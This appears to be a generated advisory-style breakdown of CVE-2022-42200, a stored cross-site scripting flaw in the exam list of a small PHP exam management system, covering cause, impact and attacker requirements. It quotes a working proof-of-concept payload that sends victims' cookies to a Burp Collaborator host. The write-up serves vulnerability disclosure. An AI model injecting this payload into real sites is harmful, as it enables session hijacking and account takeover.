Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2022-42200:

**Root Cause of Vulnerability:**
- The root cause is the lack of proper input sanitization in the "Simple Exam Reviewer Management System" when creating or editing exam list entries.

**Weaknesses/Vulnerabilities Present:**
- Stored Cross-Site Scripting (XSS) vulnerability exists in the Exam List functionality.
- The application does not properly sanitize user-supplied input in the Title and Description fields when creating or editing exams.

**Impact of Exploitation:**
- Attackers can inject malicious JavaScript code into the application's database by crafting a specific payload in the title and description fields of an exam.
- When other users view the affected exam, the injected JavaScript payload executes in their browsers.
- This can lead to:
  - Session hijacking by stealing cookies.
  - Masquerading as authorized users, allowing the attacker to perform actions as a logged-in user.
  -  Potential redirection of users to malicious sites or other malicious activities.

**Attack Vectors:**
- An attacker needs to access the application's "Exam List" functionality.
- The attacker must be able to create a new exam or modify existing exam records.
- The attacker injects a malicious JavaScript payload in the Title and Description fields during the creation or modification of the exam.

**Required Attacker Capabilities/Position:**
- The attacker needs to be authenticated with sufficient privileges to create or modify exams.
- No specific user role information is mentioned, so it is assumed any authorized user with these privileges can exploit the vulnerability.
- The attacker must have a basic understanding of XSS payloads to successfully craft a malicious payload.
- The attacker needs to know the application's functionality for managing exam listings.

**Additional Notes:**
- The affected component is "ERMS v1.0 - Simple Exam Reviewer Management System in PHP/OOP."
- The provided proof-of-concept payload uses an `<img>` tag with an `onerror` event to execute JavaScript code that attempts to send the user's cookies to a Burp Collaborator server.
```
<img src=x onerror=(window.location='[https://o1q2amfm97kh8cn0zmbc0qi9k0qqef.burpcollaborator.net/?'+document.cookie](https://o1q2amfm97kh8cn0zmbc0qi9k0qqef.burpcollaborator.net/?%27+document.cookie))>
```
- The vulnerability is triggered when a user visits the exam list, causing the malicious payload to execute in their browser.
